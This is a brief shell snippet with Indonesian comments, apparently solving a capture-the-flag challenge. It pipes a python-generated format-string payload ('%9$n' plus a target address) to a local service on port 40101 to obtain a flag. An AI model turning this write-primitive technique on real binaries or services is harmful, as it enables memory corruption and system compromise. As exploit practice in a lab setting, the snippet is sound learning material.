# Python cuma ngeprint payload mentah (raw bytes) ke stdout, lalu di-pipe ke nc.
# -q2 -> nc tutup koneksi 2 detik setelah stdin EOF, cukup buat nerima balasan flag.
python3 -c "import sys,struct; sys.stdout.buffer.write(b'AAAA%9\$n' + struct.pack('<Q', 0x4040c0) + b'\n')" | nc -q2 localhost 40101
